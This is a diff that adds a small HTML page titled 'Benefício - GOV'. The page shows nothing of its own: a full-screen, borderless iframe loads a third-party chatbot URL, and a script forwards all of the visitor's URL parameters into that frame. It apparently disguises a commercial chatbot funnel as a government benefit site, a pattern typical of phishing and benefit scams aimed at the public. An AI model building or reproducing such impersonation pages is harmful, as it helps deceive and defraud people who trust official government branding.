@@ -1,0 +1,33 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Benefício - GOV</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+    <script>
+        function passIframeData() {
+            var a = document.querySelector("iframe"),
+                e = new URL(a.src);
+            new URL(window.location.href).searchParams.forEach((a, r) => e.searchParams.set(r, a));
+            a.src = e.href;
+        }
+        window.onload = passIframeData; // Chama a função quando a janela é carregada
+    </script>
+</head>
+<body>
+    <!-- Este é o iframe que carrega o conteúdo do site desejado -->
+    <iframe src="https://chat.zippybot.com.br/l-limpa-zm0ngk0" frameborder="0"></iframe>
+
+
+</body></html>
